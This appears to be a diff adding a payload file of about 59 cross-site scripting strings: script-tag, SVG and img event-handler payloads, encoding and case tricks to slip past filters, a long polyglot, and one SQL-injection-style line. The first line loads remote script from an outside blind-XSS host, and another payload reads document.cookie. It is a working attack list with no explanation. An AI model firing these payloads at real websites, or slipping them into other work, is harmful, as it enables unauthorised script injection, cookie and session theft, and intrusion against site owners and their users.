@@ -1,0 +1,59 @@
+"><script src=//snowglobe.xss.ht></script>
+<a/href="/alert(1)/">
+<svg><animate xlink:href=# attributeName=href values=&#106;avascript:alert(1) /><a id=x><rect width=100 height=100 /> </a>
+<h1/%6f%6e/oNclicK=alert`SnowGlobe`>CLICK HERE
+<svg/%6f%6e/oNloaD=alert`SnowGlobe`>
+<svg onload='alert(1)'
+<svg onload="alert(1)"
+<svg onload=alert(1)//
+<svg onload=alert(1)+
+<svg onload=alert(1)<!--
+"-promtp`1`-"
+1"==(_=confirm,_(1))=="
+\&#34;+confirm(1)+&#34;
+"-alert(0)-"
+"-top['al\x65rt']('SnowGlobe')-"
+<svg onload=promtp%26%230000000040document.domain)>
+<svg onload=promtp%26%23x000000028;document.domain)>
+<img/src=x onError="`${x}`;alert(`SnowGlobe`);">
+<img/src=x onerror=prompt(1)>
+"\/><img%20s+src+c=x%20on+onerror+%20="alert(1)"\>
+"/><svg+svg+svg\/\/On+OnLoAd=confirm(1)>
+<script>alert("OPENBUGBOUNTY")</script>
+<script>alert(123);</script>
+<ScRipT>alert("OPENBUGBOUNTY");</ScRipT>
+"><script>alert("OPENBUGBOUNTY")</script>
+<script>alert(/XSS/)</script>
+<script abc>alert(1)</script abc>
+<script%20a%20b%20c%20>alert(1)</script%20d%20e%20f>
+<script%20a%20b%20c%20>alert(String.fromCharCode(49))</script%20d%20e%20f>
+<script%20a%20b%20c%20>window[490837..toString(1<<5)](atob('YWxlcnQoMSk='))</script%20d%20e%20f>
+</script><script>alert(1)</script>
+</script><sCrIpT>alert(/OPENBUGBOUNTY/)</ScRiPt>
+'></script>"<script>alert(1)</script>
+<scRipt>alert.call(%20,"XSS");</scRipt>
+<scRipt>alert.call(null, document.cookie);</scRipt>
+"></title></script><svg/onload=alert(/OPENBUGBOUNTY/)>
+"/><svg+svg+svg\/\/On+OnLoAd=confirm(1)>
+"/><svg+svg+svg\/\/On+OnLoAd+%20=confirm(1)>
+<Svg One OnLoad=alert(1)>
+'; alert(1);
+')alert(1);//
+<ScRiPt>alert(1)</sCriPt>
+<IMG SRC=jAVasCrIPt:alert('XSS')>
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+<IMG SRC=javascript:alert('XSS')>
+<img src=xss onerror=alert(1)>
+<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">
+<Video> <source onerror = "javascript: alert (XSS)">
+<Input value = "XSS" type = text>
+<scrpt>confirm()</scrpt>
+test" autofocus onfocus="alert('XSS')
+<style/onload=&nbsp;co\u006efirm("SnowGlobe")></style>
+test”/><img src=x onerror=prompt(document.domain)>
+JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
+1'/**/oR/**/50!=22;#
+"-top['al\x65rt']('Snowglobe')-"
+\&#34;+confirm(1)+&#34;
+<p ondragend=[1].map(prompt) draggable="true">dragMe</p>
